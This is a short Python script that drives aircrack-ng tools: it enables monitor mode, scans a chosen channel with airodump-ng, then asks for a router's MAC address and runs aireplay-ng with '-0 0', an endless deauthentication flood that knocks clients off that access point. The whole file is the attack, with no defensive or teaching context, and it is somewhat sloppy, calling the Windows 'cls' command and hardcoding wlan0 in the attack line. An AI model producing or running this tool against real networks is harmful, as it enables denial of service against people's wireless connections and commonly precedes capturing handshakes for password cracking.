import os 

os.system("sudo airmon-ng start wlan0")
interface = input("enter your interface: ")
ent_ch = input("enter your network channel: ")
os.system(f"sudo airodump-ng {interface} -c {ent_ch}")
try: 
  os.system("cls")
  enter_mac_address = input("enter the ap of the router: ")
  os.system(f"sudo aireplay-ng -0 0 -a {enter_mac_address} wlan0")
except KeyboardInterrupt:
 os.system("cls")

